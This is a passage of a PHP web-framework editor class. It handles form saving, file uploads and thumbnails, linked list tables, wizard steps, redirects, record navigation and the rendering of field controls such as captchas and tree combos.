              if (safe($field, 'auto_folder'))
                $folder = $field["folder"].$this->table.'/'.$this->key().'/';
              else  
                $folder = $field["folder"];
              break;
          }
          mk_dir($folder);
          $new_file = $folder.$new_file_name;
          move_uploaded_file($tmp_file, $new_file);
          if (safe($field, "create_thumbnail")) {
            if (preg_match("/(?:\/|\\\\)$/", $field["folder"]))
              $thumb_folder = preg_replace("/(?:\/|\\\\)$/si", "_thumb/", $field["folder"]);
            else
              $thumb_folder = $field["folder"].'_thumb/';
            @mk_dir($thumb_folder);
            make_thumbnail($new_file, safe($field, "thumb_width")?$field["thumb_width"]:60, safe($field, "thumb_height")?$field["thumb_height"]:60, $thumb_folder.$new_file_name);
          }
          if (safe($field, "thumbnails")) {
            create_image_thumbnails($new_file, $field['thumbnails']);
          }
        }

        if ($current_file && (strtolower($current_file) != strtolower($new_file_name))) {
          switch(safe($field, 'storage_mode')) {
            case "optimal":                                
              $folder = optimal_file_storage_path($field["folder"], $this->table, $this->key(), safe($field, 'optimal_storage_field_name', $field['name']));
              break;
            default:
              if (safe($field, 'auto_folder'))
                $folder = $field["folder"].$this->table.'/'.$this->key().'/';
              else  
                $folder = $field["folder"];
              break;
          }
          $foldersCurrentFiles = array('');
          if (safe($field, "thumbnails")) {
            foreach((array)safe($field, "thumbnails") as $f => $i){
                $foldersCurrentFiles[] = $f.'/';
            }
          }
          foreach($foldersCurrentFiles as $folderCurrentFile){
              if (file_exists($folder.$folderCurrentFile.$current_file))
                unlink($folder.$folderCurrentFile.$current_file);
          }
        }
        
      }
      
      $uploads = array();

      foreach($this->fields as $field) {
      
        $relevant = true;
        $control_name = null;
        
        if (safe($field, 'linked_to_field')) {
          $linked_field = $field['linked_to_field'];
          $linked_field_value = post($this->context_id($linked_field['control']));
          if (array_key_exists($linked_field_value, $field['linked_values'])) {
            $relevant = true;
            $control_name = $field['linked_values'][$linked_field_value];
          }
        }
        
        if ($relevant && !safe($field, 'virtual') && $this->is_field_link($field) && !$this->is_field_read_only($field) && (safe($field, 'table', $this->table) == $table)) {

          $field_name           = $field["name"];
          if (!$control_name)
            $control_name         = $field["control"];
          $context_control_name = $this->context_id($control_name);
          $type                 = safe($field, "type");
          $data_type            = safe($field, 'data_type', safe(safe($defs, $field_name), 'type', 'text'));

          switch ($type) {
            case "check_list":
              if (is_array(post($context_control_name))) {
                if (safe($field, "check_list_dic_table")) {
                  if (!$this->insert())
                    $dm->delete_where($field["check_list_link_table"], array($field["check_list_link_pk_field"] => $key_value));
                  foreach(post($context_control_name) as $key => $value) {
                    if (!is_numeric($value) and $value) 
                      $dm->insert( $field["check_list_link_table"]
                                 , array( $field["check_list_link_pk_field"] => $key_value
                                        , $field["check_list_link_fk_field"] => $key
                                        ));
                    else
                    if (is_numeric($value) and ($value > 0))
                      $dm->insert( $field["check_list_link_table"]
                                 , array( $field["check_list_link_pk_field"] => $key_value
                                        , $field["check_list_link_fk_field"] => $key
                                        , $field["check_list_dic_field"]     => $value
                                        ));
                  }
                } else {
                  $values = post($context_control_name);
                  if (!$this->insert()) {
                    $query = $db->query( 'SELECT '.$field["check_list_link_pk_field"].', '.$field["check_list_link_fk_field"].' 
                                            FROM '.$field["check_list_link_table"].'
                                           WHERE '.$field["check_list_link_pk_field"].' = ?'
                                       , $key_value);
                    while ($query_row = $db->next_row($query)) 
                      if (!array_key_exists($query_row[$field["check_list_link_fk_field"]], $values))
                        $dm->delete_where( $field["check_list_link_table"]
                                         , array( $field["check_list_link_pk_field"] => $query_row[$field["check_list_link_pk_field"]]
                                                , $field["check_list_link_fk_field"] => $query_row[$field["check_list_link_fk_field"]])
                                         );
                  }
                  foreach(post($context_control_name) as $key => $value) {
                    if (!$db->row( 'SELECT * 
                                      FROM '.$field["check_list_link_table"].' 
                                     WHERE '.$field["check_list_link_pk_field"].' = ? 
                                       AND '.$field["check_list_link_fk_field"].' = ?'
                                 , $key_value
                                 , $key)) {
                      $values = array_merge( array( $field["check_list_link_pk_field"] => $key_value
                                                  , $field["check_list_link_fk_field"] => $key
                                                  )
                                           , safe($field, 'check_list_additional_fields', array())
                                           );
                      $dm->insert( $field["check_list_link_table"]
                                 , $values
                                 );
                    }                    
                  }
                }
              } else {
                $dm->delete_where( $field["check_list_link_table"]
                                 , array( $field["check_list_link_pk_field"] => $key_value)
                                 );
              }
              break;
            case "lookup_list":
              if (!$this->insert())
                $dm->delete_where($field["lookup_list_link_table"], array($field["lookup_list_link_pk_field"] => $key_value));
              if (is_array(post($context_control_name))) {
                foreach(post($context_control_name) as $value) {
                  if (strlen(safe($value, 'value'))) {
                    $dm->insert( $field["lookup_list_link_table"]
                               , array( $field["lookup_list_link_pk_field"] => $key_value
                                      , $field["lookup_list_link_fk_field"] => safe($value, 'value')
                                      ));
                  }
                }
              }
              break;
            case "list":
              if (!$this->insert())
                $dm->delete_where($field["list_link_table"], array($field["list_link_pk_field"] => $key_value));
              if (is_array(post($context_control_name))) {
                foreach(post($context_control_name) as $key) {
                  $dm->insert( $field["list_link_table"]
                             , array( $field["list_link_pk_field"] => $key_value
                                    , $field["list_link_fk_field"] => $key
                                    ));
                }
              }
              break;    
          }
        }
      }
    }
    
    return true;
  }

  function save_fields() {
    
    if ($this->internal_save_fields($this->table, $this->key_field, $this->key(), true)) {
      foreach ($this->tables as $table => $key_field)
        if (!$this->internal_save_fields($table, $key_field, $this->key(), false))
          return false;
      return true;
    } else {
      return false;
    }
    
  }
  
  function do_save_file($tmp_file, $new_file_name, $file_info, $field) {

    return false;

  }

  function clear_post_buffer() {

    foreach ($this->fields as $field)
      if ($this->is_field($field)) {
        $control_name = $field["control"];
        $context_control_name = $this->context_id($control_name);
        set_post($context_control_name);
      }

  }

  function internal_save() {

    if ($this->do_before_check_post()) {
      if ($this->check_post()) { 
        if ($this->do_after_check_post()) {   
          if ($this->do_before_save()) {
            if ($this->save_fields()) {
              if ($this->capable('update_inserts_history') and $this->insert()) {
                global $browsing_history, $url, $db;
                $this->generate_title();
                $edit_href = $url->generate_full_url(array( URL_PARAM_ACTION       => 'edit'
                                                          , URL_PARAM_KEY          => $db->encrypt_key($this->key())
                                                          , URL_PARAM_POPUP_WINDOW => 1
                                                          ));
                $browsing_history->register(trn("Edit ").$this->display_name, $this->get_record_name(), $edit_href);
              }
              if ($this->do_save()) {
                $this->do_after_save($this->context_post(POST_PARAM_CONFIRM_VALUE));
                return true;
              }
            }
          }
        }
      } else {
        $this->do_after_check_post();
      }
    }
    
    if (count($this->error_controls)) {
      $this->active_control = $this->error_controls[0];
    }
      
    return false;

  }

  function clear_field($name) {

    global $dm;

    foreach($this->fields as $field) {

      if (safe($field, "name") == $name) {
        
        if (!$this->insert() and $this->is_field_real($field)) {
          $values = array($name => null);
          if (safe($field, "file_size_field")) 
            $values = array_merge($values, array($field["file_size_field"] => null));
          if (safe($field, "file_type_field")) 
            $values = array_merge($values, array($field["file_type_field"] => null));
          if (safe($field, "file_name_field")) 
            $values = array_merge($values, array($field["file_name_field"] => null));
          $dm->update($this->table, $values, $this->key());
          $this->row_requested = false;
        }

        $control_name = $field["control"].__HTML_CONTROL_NAME_SEPARATOR."current";
        $context_control_name = $this->context_id($control_name);
        $current_file = post($context_control_name);
        if ($current_file) {
          switch(safe($field, 'storage_mode')) {
            case "optimal":                                
              $folder = optimal_file_storage_path($field["folder"], $this->table, $this->key(), safe($field, 'optimal_storage_field_name', $field['name']));
              break;
            default:
              if (safe($field, 'auto_folder'))
                $folder = $field["folder"].$this->table.'/'.$this->key().'/';
              else  
                $folder = $field["folder"].$this->key().'/';
              break;
          }
          $current_file = $folder.$current_file;
          if (file_exists($current_file))
            unlink($current_file);
        }
        set_post($context_control_name);

        $control_name = $field["control"];
        $context_control_name = $this->context_id($control_name);
        set_post($context_control_name);

        break;
        
      }
    }

  }

  function get_close_script($refresh_caller = false) {
      
    if ($this->wizard_mode or $this->cancel_via_post_back)
      return $this->js_post_back('edt_cancel');
    else 
    if (get(URL_PARAM_POPUP_WINDOW))
      return "__ClosePopup(".($refresh_caller?'true':'false').")";
    else {
      global $url;
      $redirect = $this->cancel_redirect;
      if ($redirect == "") {
        if ($this->capable('cancel_edit')) {
          $redirect = $url->current_url;
        } else {
          $back_entity = get(URL_PARAM_CALLER_ENTITY);
          if (!$back_entity)
            $back_entity = $this->entity_name_for("browse");
          if (!$back_entity)
            $back_entity = get(URL_PARAM_ENTITY);
          $redirect = $url->generate_full_url(array( $this->action_param     => null
                                                   , $this->key_param        => null
                                                   , URL_PARAM_ENTITY        => $back_entity
                                                   , URL_PARAM_CALLER_ENTITY => null
                                                   ));
        }
      } else {
        global $db;  
        $redirect = str_replace(PLACEHOLDER_KEY_ENC, $db->encrypt_key($this->key()), $redirect);
        $redirect = str_replace(PLACEHOLDER_KEY,     $db->encrypt_key($this->key()), $redirect);
        //$redirect = str_replace(PLACEHOLDER_KEY,                      $this->key(),  $redirect);
      }
      return "document.location='$redirect';";
    }

  }
  
  function goto_caller($with_refresh = false) {

    move_browser_record_pointer($this->table, $this->key());

    if (get(URL_PARAM_POPUP_WINDOW)) {
      $close_popup_refresh  = ($with_refresh ? 'true' : 'false');
      $close_popup_callback = get(URL_PARAM_POPUP_CLOSE_CALLBACK);
      $this->add(new script("__ClosePopup(".$close_popup_refresh.", ".($this->key()?$this->key():"''").", '".$close_popup_callback."')"));
    } else {
      global $url;
      $redirect = $this->save_redirect;
      if (!$redirect)
        $redirect = $this->save_redirect_js;
      if (!$redirect) {
        $back_entity = get(URL_PARAM_CALLER_ENTITY);
        if (!$back_entity)
          $back_entity = $this->entity_name_for("browse");
        if (!$back_entity)
          $back_entity = get(URL_PARAM_ENTITY);
        $redirect = $url->generate_full_url(array( $this->action_param     => null
                                                 , $this->key_param        => null
                                                 , URL_PARAM_ENTITY        => $back_entity
                                                 , URL_PARAM_CALLER_ENTITY => null
                                                 ));
      } else {
        global $db;  
        $redirect = str_replace(PLACEHOLDER_KEY_ENC, $db->encrypt_key($this->key()), $redirect);
        $redirect = str_replace(PLACEHOLDER_KEY,     $db->encrypt_key($this->key()), $redirect);
        //$redirect = str_replace(PLACEHOLDER_KEY,                      $this->key(),  $redirect);
      }
      if ($this->save_redirect_js)
        js_redirect($redirect);
      else  
        redirect($redirect);
    }
    
    return true;

  }

  function save() {
    
    if ($this->internal_save()) {
      if ($this->wizard_mode) {
        if ($this->last_wizard_step()) {
          $this->clear_stored_values();  
          return $this->goto_caller(!get(URL_PARAM_SILENT_CLOSE_POPUP));
        } else {
          $this->set_wizard_step($this->get_wizard_step() + 1);
          refresh();
        }
      } else {
        $this->clear_stored_values();     
        return $this->goto_caller(!get(URL_PARAM_SILENT_CLOSE_POPUP));
      }
    } else
      return false;

  }

  function do_cancel() {
  }
  
  function cancel_and_edit() {

    if ($this->wizard_mode)
      $this->clear_stored_values();
    $this->do_cancel();
        
  }

  function cancel() {

    if ($this->wizard_mode)
      $this->clear_stored_values();
    $this->do_cancel();
    return $this->goto_caller($this->always_refresh_caller);

  }

  function save_and_edit() {

    if ($this->internal_save()) {
      if ($this->message_save_result) 
        $this->set_setting('message_from_prior_session', sprintf(trn("Changes last saved at %s"), strftime_(DISPLAY_TIME_FORMAT, mktime())));
    } else
      return false;
        
  }
  
  function is_apply_mode() {
    
    return ($this->context_post(POST_PARAM_EVENT_NAME) == "edt_apply");
    
  }

  function is_copy_mode() {
    
    return (get(URL_PARAM_ACTION) == "copy");
    
  }

  function apply() {

    if ($this->internal_save()) {
      if ($this->message_save_result) 
        $this->set_setting('message_from_prior_session', sprintf(trn("Changes last saved at %s"), strftime_(DISPLAY_TIME_FORMAT, mktime())));
      return $this->goto_edit();
    } else
      return false;
      
  }

  function goto_edit() {

    global $url;
    global $db;
    
    if ($this->controlled_outside) {
      refresh();
    } else {
      $redirect = $url->generate_full_url(array( $this->action_param => "edit"
                                               , $this->key_param    => $db->encrypt_key($this->key())
                                               ));
      redirect($redirect);
    }

  }

  function goto_new() {

    global $url;
    $redirect = $url->generate_full_url(array( $this->action_param => "insert"
                                             , $this->key_param    => null
                                             ));
    redirect($redirect);

  }

  function save_and_new() {

    if ($this->internal_save()) 
      return $this->goto_new();

  }

  function save_and_next() {

    if ($this->internal_save()) 
      return $this->goto_next();

  }

  function goto_next() {

    global $url;
    global $db;

    $next_key = $db->value("SELECT MIN(".$this->key_field.") FROM ".$this->table." WHERE ".$this->key_field." > ?", $this->key());
    if ($next_key) {
      $redirect = $url->generate_full_url(array( $this->key_param    => $db->encrypt_key($next_key)));
      redirect($redirect);
    } else {
      $this->show_alert("This is last record");
    }

  }

  function save_and_prior() {

    if ($this->internal_save()) 
      return $this->goto_prior();

  }

  function goto_prior() {

    global $url;
    global $db;

    $next_key = $db->value("SELECT MAX(".$this->key_field.") FROM ".$this->table." WHERE ".$this->key_field." < ?", $this->key());
    if ($next_key) {
      $redirect = $url->generate_full_url(array( $this->key_param    => $db->encrypt_key($next_key)));
      redirect($redirect);
    } else {
      $this->show_alert("This is first record");
    }

  }   
  
  function get_source_row() {
    
    if ($this->source_key() && !$this->source_row && !$this->source_row_requested) {
      global $db;
      $this->source_row = $db->row('SELECT * FROM '.$this->table.' WHERE '.$this->key_field.' = ?', $this->source_key());
      $this->source_row_requested = true;
    }
    
  }                        

  function get_data_row() {

    if (!$this->row_requested) {
      global $db;
      if ($this->virtual) {
        $this->row = array();
        $this->row_retrieved = true;
      } else 
      if ($this->action() != "insert") {
        if ($this->row = $db->row("SELECT * FROM ".$this->table." WHERE ".$this->key_field." = ?", $this->key()))
          $this->row_retrieved = true;
        else
          $this->row_retrieved = false;
      } else {
        if ($this->read_only)
          $this->row_retrieved = false;
        else
        if ($this->virtual)
          $this->row_retrieved = true;
        else {   
          $this->row = $db->query("SELECT * FROM ".$this->table." WHERE 1 > 1");
          $this->row_retrieved = true;
        }
      }
      if ($this->row_retrieved) {
        $this->data_rows[$this->table] = $this->row;
        foreach ($this->tables as $table => $link_field) {
          $this->data_rows[$table] = $db->row("SELECT * FROM ".$table." WHERE ".$link_field." = ?", $this->key());
        }
      }
      $this->row_requested = true;
    }

    return $this->row_retrieved;

  }
  
  function get_current_value($field_name, $default = null, $force_virtual = false) {

    $field = safe($this->fields, $field_name);

    $control_name         = safe($field, "control", $field_name);
    $context_control_name = $this->context_id($control_name);
    $posted_value         = post($context_control_name);
    if (safe($field, 'type') == 'lookup')
      $posted_value = safe($posted_value, 'value');
    $default_value        = null;
    if ($this->virtual)
      $default_value      = $this->get_stored_value($field_name);
    if (!$default_value)
      $default_value      = safe($this->defaults, $field_name, safe($field, "default"));
    $virtual_field = safe($field, "virtual") || $force_virtual || $this->virtual; 
    $field_value = null; 
    
    switch (safe($field, 'type')) {
      case 'check_list':
        global $db;
        if (!$this->insert()) {
          $field_value = array();  
          $sql = sql_placeholder("SELECT * ".
                                 "  FROM ".$field["check_list_link_table"]." ".
                                 " WHERE ".$field["check_list_link_pk_field"]." = ?", $this->row[safe($field, "check_list_field", $this->key_field)]);
          $query = $db->query($sql);
          while ($row = $db->next_row($query)) {
            if (safe($field, "check_list_dic_table"))
              $field_value[$row[$field["check_list_link_fk_field"]]] = $row[$field["check_list_dic_field"]];
            else
              $field_value[$row[$field["check_list_link_fk_field"]]] = 0;
          }
        }
        if ($this->initial()) 
          if ($this->insert) {
            $value = $posted_value;
            if (!$value)
              $value = array();
          } else
            $value = $field_value;
        else
          $value = $posted_value;
        if (!is_array($value))
          $value = array($value => 0);
        $result = array();
        foreach($value as $key => $val)
          $result[] = $key;
        return $result;
      default:  
        if (!$this->insert()) {
          if ($virtual_field) {
            $field_value = safe($field, "value");
            if (!$field_value)
              $field_value = $this->do_fill_field($field_name);  
          } else {
            if ($this->get_data_row()) {
              $field_row = null;
              foreach ($this->data_rows as $table => $row) {
                if (is_array($row)) {
                  if (array_key_exists($field_name, $row)) {
                    $field_row = $row;
                    break;
                  }
                }
              }
              if ($field_row) 
                $field_value = $field_row[$field_name];
              else 
                critical_error("Field $field_name not found");
            }   
          }
        }

        if ($this->initial()) {
          if ($this->insert()) {
            $value = $posted_value;
            if (!$value)
              $value = $default_value;
          } else {
            $value = $field_value;
            if (!strlen($value)) {
              $value = $posted_value;
            }
          }
        } else {
          if ($this->is_field_read_only($field) || (!$field && !$force_virtual))
            $value = $field_value;
          else 
            $value = $posted_value;
        }

        if (!$value)
          $value = $default;
          
        return $value;
    }
      
  }
  
  function set_current_value($name, $value) {
    
    set_post($this->context_id($name), $value);
    
  }

  function get_default_value($table, $default_sign_field) {

    if ($this->initial() and $this->insert()) {
      global $db;  
      global $dm;
      $dm->table($table);
      return $db->value("SELECT ".$dm->key_field($table)." FROM ".$table." WHERE ".$default_sign_field." = 1");
    } else
      return null;  
      
  }
  
  function get_stored_value($name, $default = null) {
    
    $stored_values = session_get($this->storage);
    return safe($stored_values, $name, $default);
    
  }
  
  function set_stored_value($name, $value) {
    
    $stored_values = session_get($this->storage);
    $stored_values[$name] = $value;
    session_set($this->storage, $stored_values);
    
  }
  
  function clear_stored_values() {

    session_set($this->storage, null);
    
  }


  function get_wizard_step() { 
    
    $step = $this->get_stored_value(EDITOR_WIZARD_STEP_TAG, 1);
    if ($step < 1) 
      $this->set_wizard_step(1);
    return $this->get_stored_value(EDITOR_WIZARD_STEP_TAG, 1); 
    
  }
  
  function set_wizard_step($step) { 

    return $this->set_stored_value(EDITOR_WIZARD_STEP_TAG, $step); 

  }

  function last_wizard_step() { 
    
    return ($this->get_wizard_step() == $this->wizard_steps_amount); 
    
  }
  
  function render_field($cell, $field, $read_only = false, $sub_container = false) {

    global $db;
    global $dm;

    $defs = array();  
    $type                 = safe($field, "type");
    $field_name           = $field["name"];
    $table_name           = safe($field, 'table', $this->table);
    if (!$this->virtual)
      $defs               = $dm->fields($table_name);
    $field_label          = safe($field, "label");
    $field_value          = null;
    $control_name         = $field["control"];
    $context_control_name = $this->context_id($control_name);
    $data_type            = safe($field, 'data_type', safe(safe($defs, $field_name), 'type', 'text'));
    $posted_value         = post($context_control_name);
    $default_value        = null;
    if ($this->virtual)
      $default_value      = $this->get_stored_value($field_name);
    if (!$default_value)
      $default_value      = safe($this->defaults, $field_name, safe($field, "default")); 
    $virtual_field        = safe($field, "virtual") || $this->virtual; 
    switch ($type) {
      case "check_list": 
        if (!$this->insert()) {
          if (!$virtual_field) {
            $field_value = array();  
            $sql = sql_placeholder("SELECT * ".
                                   "  FROM ".$field["check_list_link_table"]." ".
                                   " WHERE ".$field["check_list_link_pk_field"]." = ?", $this->row[safe($field, "check_list_field", $this->key_field)]);
            $query = $db->query($sql);
            while ($row = $db->next_row($query)) {
              if (safe($field, "check_list_dic_table"))
                $field_value = $field_value + array($row[$field["check_list_link_fk_field"]] => $row[$field["check_list_dic_field"]]);
              else
                $field_value = $field_value + array($row[$field["check_list_link_fk_field"]] => 0);
            }
          } else {
            $field_value = safe($field, "value");
          }
        }
        if ($this->initial()) { 
          if ($this->insert) {
            $value = $posted_value;
            if (!$value)
              $value = $default_value;
            if (!$value)
              $value = array();
          } else {
            $value = $field_value;
          }
        } else {
          $value = $posted_value;
        }
        if (!is_array($value))
          $value = array($value => 0);
        break;
      case "lookup_list": 
        $posted_value = array();
        $posted_value_ = post($context_control_name);
        if (is_array($posted_value_))
          foreach($posted_value_ as $value)
            if (strlen(safe($value, "value")))
              $posted_value[] = $value["value"];
        if (!$this->insert()) {
          $field_value = array();
          $sql = sql_placeholder("SELECT * ".
                                 "  FROM ".$field["lookup_list_link_table"]." ".
                                 " WHERE ".$field["lookup_list_link_pk_field"]." = ?", $this->row[$this->key_field]);
          $query = $db->query($sql);
          while ($row = $db->next_row($query)) {
            $field_value[] = $row[$field["lookup_list_link_fk_field"]];
          }
        }
        if ($this->initial()) 
          if ($this->insert) {
            $value = $posted_value;
            if (!$value)
              $value = array();
          } else
            $value = $field_value;
        else
          $value = $posted_value;
        if (!is_array($value))
          $value = array();
        break;
      case "list":
        if (!$this->insert()) {
          if (!$virtual_field) {
            $field_value = array();
            $sql = sql_placeholder("SELECT * ".
                                   "  FROM ".$field["list_link_table"]." ".
                                   " WHERE ".$field["list_link_pk_field"]." = ?", $this->row[$this->key_field]);
            $query = $db->query($sql);
            while ($row = $db->next_row($query)) {
              $field_value[] = $row[$field["list_link_fk_field"]];
            }
          } else {
            $field_value = safe($field, "value");
          }
        }
          
        if ($this->initial()) {
          if ($this->insert) {
            $value = $posted_value;
            if (!$value)
              $value = array();
          } else
            $value = $field_value;
        } else
          $value = $posted_value;
        if (!is_array($value))
          $value = array($value => 0);
        break;
      case "credit_card":
        if (!$this->insert()) {
          if (array_key_exists($field_name, $this->data_rows[$table_name])) {
            $field_value = $this->data_rows[$table_name][$field_name];
          } else 
          if (safe($field, "virtual")) {
            $field_value = safe($field, "value");
            if (!$field_value)
              $field_value = $this->do_fill_field($field_name);
          } else {
            critical_error("Field $field_name not found");
          }
        }
        
        if ($this->initial()) {
          if ($this->insert()) {
            $value = $posted_value;
            if (!$value)
              $value = $default_value;
          } else {
            $value = $field_value;
            if (!strlen($value)) 
              $value = $posted_value;
            else
              $value = format_credit_card($value);
          }
        } else
          $value = $posted_value;
        break;
      case "ipv4":
        if (!$this->insert()) {
          if (array_key_exists($field_name, $this->data_rows[$table_name])) {
            $field_value = $this->data_rows[$table_name][$field_name];
          } else 
          if (safe($field, "virtual")) {
            $field_value = safe($field, "value");
            if (!$field_value)
              $field_value = $this->do_fill_field($field_name);
          } else {
            critical_error("Field $field_name not found");
          }
        }
        if ($this->initial()) {
          if ($this->insert()) {
            $value = $posted_value;
            if (!$value)
              $value = $default_value;
          } else {
            $value = $field_value;
            if (!strlen($value)) 
              $value = $posted_value;
            else 
            if ($data_type != 'text')
              $value = ip_num_to_str($value);
          }
        } else
          $value = $posted_value;
        break;
      case "text":
        $value = safe($field, "value");
        break; 
      case "lookup":
        $posted_value  = post($context_control_name);
        $posted_value  = safe($posted_value, "value");
        //break;  
      default:  
        if (!$this->insert()) {
          if ($virtual_field) {
            $field_value = safe($field, "value");
            if (!strlen($field_value))
              $field_value = $this->do_fill_field($field_name);
          } else
          if (array_key_exists($field_name, $this->data_rows[$table_name])) {
            $field_value = $this->do_fill_field($field_name);
            if (!strlen($field_value))
              $field_value = $this->data_rows[$table_name][$field_name];
          } else 
            critical_error("Field $field_name not found");
        }

        if ((($data_type == "date") || ($data_type == "date_time")) && ($type != 'hidden')) {  
          $value = null;
          $time_value = null;
          if ($this->initial()) {
            if ($this->insert) {
              $value = $posted_value;
              if ($data_type == "date_time")
                $time_value = post($context_control_name.__HTML_CONTROL_NAME_SEPARATOR.'time');
              if (!$value)
                if ($default_value) { 
                  $value = strftime(INTERNAL_DATE_FORMAT, $default_value);
                  if ($data_type == "date_time")
                    $time_value = strftime(INTERNAL_TIME_FORMAT, $default_value);
                }
            } else {
              if (!$db->date_empty($field_value)) {
                $value = strftime(INTERNAL_DATE_FORMAT, $db->from_date($field_value));
                if ($data_type == "date_time")
                  $time_value = strftime(INTERNAL_TIME_FORMAT, $db->from_datetime($field_value));
              }  
            }   
          } else {
            if ($this->is_field_read_only($field)) {
              if (!$db->date_empty($field_value)) {
                $value = strftime(INTERNAL_DATE_FORMAT, $db->from_date($field_value));
                if ($data_type == "date_time")
                  $time_value = strftime(INTERNAL_TIME_FORMAT, $db->from_datetime($field_value));
              }  
            } else {
              $value = $posted_value;
              if ($data_type == "date_time")
                $time_value = post($context_control_name.__HTML_CONTROL_NAME_SEPARATOR.'time');
            }
          }
        } else  {
        
          if (strlen($field_value) && ($data_type == "real") && safe($field, 'decimal_digits')) {
            $field_value = number_format($field_value, safe($field, 'decimal_digits'), '.', '');
          }

          if ($this->initial()) {
            if ($this->insert()) {   
              $value = $posted_value;
              if (!$value)
                $value = $default_value;
            } else {
              $value = $field_value;
              if (!strlen($value)) {
                $value = $posted_value;
              }
            }
          } else {               
            if ($this->is_field_read_only($field)) 
              $value = $field_value;      
            else  
            if (!$this->is_field_visible($field) and $this->insert()) // hidden field
              $value = $default_value;
            else
              $value = $posted_value;
          }
        }
        if (!strlen($value) and !$this->active_control and ($data_type != 'date') and ($data_type != 'date_time')) {
          if (safe($field, 'required') and !$this->active_control_candidate)
            $this->active_control_candidate = $control_name;
          if (!safe($field, 'required') and !$this->active_control_last_candidate)
            $this->active_control_last_candidate = $control_name;
        }
        break;
    }
      
    switch ($type) {
      case "custom":
        $this->do_render_custom_field(&$cell, $this->row, $field_name);
        break;
      case "hidden":
        $cell->add(new hidden($context_control_name, $value, array('template_id' => $control_name)));
        break;
      case "text":
        $cell->add(new html_div($value, array("class" => "read_only")));
        break;
      case "captcha":
        global $captcha;
        $captcha->unset_custom_parameters();
        if (safe($field, "captcha_def") and count(safe($field, "captcha_def"))) {
          $captcha->init_custom_parameters(safe($field, "captcha_def"));
        }
        $cell->add(new image($captcha->url()));
        $attributes = array ( "id"          => $context_control_name
                            , 'template_id' => $control_name
                            //, "value" => $value
                            , "class"       => "int"
                            );
        if (safe($field, "post_on_change"))
          $attributes["onchange"] = $this->js_post_back("edt_ui_change", $control_name);
        if (safe($field, "max_length")) 
          $attributes["maxlength"] = $field["max_length"];  
        if ($read_only)  
          $attributes["disabled"] = true;
        $cell->add(new html_br());
        $cell->add(new text(trn('Please enter text on the image')));
        $cell->add(new html_br());
        $cell->add(new edit($attributes));
        break;   
      case "captcha_question":
        global $captcha_question;
        $cell->add(new text($captcha_question->get_question_string()));
        $attributes = array ( "id"          => $context_control_name
                            , 'template_id' => $control_name
                            //, "value" => $value
                            , "class"       => "int"
                            );
        if (safe($field, "style"))
          $attributes["style"] = $field['style'];
        if (safe($field, "post_on_change"))
          $attributes["onchange"] = $this->js_post_back("edt_ui_change", $control_name);
        if (safe($field, "max_length")) 
          $attributes["maxlength"] = $field["max_length"];  
        if ($read_only)  
          $attributes["disabled"] = true;
        $cell->add(new html_br());
        $cell->add(new edit($attributes));
        break;   
      case "combo_tree":
      case "combo_plain_tree":
        $attributes = array();
        $attributes['id'] = $context_control_name;
        $attributes['template_id'] = $control_name;
        $btn_view = $context_control_name.__HTML_CONTROL_NAME_SEPARATOR."view";
        $btn_edit = $context_control_name.__HTML_CONTROL_NAME_SEPARATOR."edit";
        if (safe($field, "post_on_change"))
          $attributes["onchange"] = $this->js_post_back("edt_ui_change", $control_name);
        if (safe($field, "style"))
          $attributes["style"] = $field['style'];
        if (safe($field, "width"))
          $attributes["style"] = safe($attributes, "style").'width:'.$field['width'].'px;';
        $control = new db_tree_combo( array( "table"              => safe($field, "combo_table")
                                           , "sql_text"           => safe($field, "combo_sql")
                                           , "key_field"          => safe($field, "combo_key_field")
                                           , "name_field"         => safe($field, "combo_name_field")
                                           , "order_field"        => safe($field, "combo_order_field")
                                           , "parent_field"       => safe($field, "combo_parent_field")
                                           , "base_table_alias"   => safe($field, "combo_table_alias")
                                           , "filter"             => safe($field, "combo_filter")
                                           , "required"           => safe($field, "required")
                                           , "bg_blink_color"     => safe($field, "bg_blink_color")
                                           , "soft_sort"          => safe($field, "soft_sort", false)
                                           , "selected"           => $value
                                           , "self_ref"           => safe($field, "self_ref") 
                                           , "self_ref_key"       => $this->key()
                                           , "read_only"          => $this->is_field_read_only($field)
                                           , "plain"              => ($type == "combo_plain_tree")
                                           , "strip_color"        => safe($field, "strip_color")
                                           , "disable_nested_set" => safe($field, "disable_nested_set")
                                           )
                                    , $attributes
                                    );
                                      
        if ($this->is_field_read_only($field))
          $cell->add(new html_div($control, array("class" => "read_only")));
        else {
          if (safe($field, "entity_insert") or safe($field, "entity_select") or safe($field, "entity_view") or safe($field, "entity_edit")) {
            global $url;
            global $auth;
            $tmp_row = new table_row( new table_cell($control)
                                    , new table_cell("&nbsp;"));
            if (safe($field, "entity_view") and $auth->can('editor_'.safe($field, "entity_view"), "render") and $auth->can('editor_'.safe($field, "entity_view"), "view")) {
              $href = $url->build_url(array( URL_PARAM_ACTION       => 'view'
                                           , URL_PARAM_ENTITY       => safe($field, "entity_view")
                                           , URL_PARAM_POPUP_WINDOW => 1
                                           , URL_PARAM_KEY          => PLACEHOLDER_KEY_ENC //$value
                                           ));
              $tmp_row->add(new table_cell(new javascript_image_href( placeholder(OPEN_POPUP_EDITOR_OF_KEY, $href, $context_control_name)
                                                                    , SHARED_RESOURCES_URL."img_view.gif"
                                                                    , array("alt"   => "View"
                                                                           ,"style" => "display:".($value?"inline":"none")
                                                                           ,"id"    => $btn_view))));
              $tmp_row->add(new table_cell("&nbsp;"));
            }
            if (safe($field, "entity_edit") and $auth->can('editor_'.safe($field, "entity_edit"), "render") and $auth->can('editor_'.safe($field, "entity_edit"), "edit")) {
              $href = $url->build_url(array( URL_PARAM_ACTION       => 'edit'
                                           , URL_PARAM_ENTITY       => safe($field, "entity_edit")
                                           , URL_PARAM_POPUP_WINDOW => 1
                                           , URL_PARAM_KEY          => PLACEHOLDER_KEY_ENC //$value
                                           ));
              $tmp_row->add(new table_cell(new javascript_image_href( placeholder(OPEN_POPUP_EDITOR_OF_KEY, $href, $context_control_name)
                                                                    , SHARED_RESOURCES_URL."img_edit.gif"
                                                                    , array("alt"   => "Edit"
                                                                           ,"style" => "display:".($value?"inline":"none")
                                                                           ,"id"    => $btn_edit))));
              $tmp_row->add(new table_cell("&nbsp;"));
            }
            if (safe($field, "entity_insert") and $auth->can('editor_'.safe($field, "entity_insert"), "render") and $auth->can('editor_'.safe($field, "entity_insert"), "insert")) {
              $url_params = array( URL_PARAM_ACTION       => 'insert'
                                 , URL_PARAM_ENTITY       => safe($field, "entity_insert")
                                 , URL_PARAM_POPUP_WINDOW => 1
                                 );
              if (safe($field, 'entity_call_defaults'))
                $url_params[URL_PARAM_DEFAULTS] = urlencode($field['entity_call_defaults']);
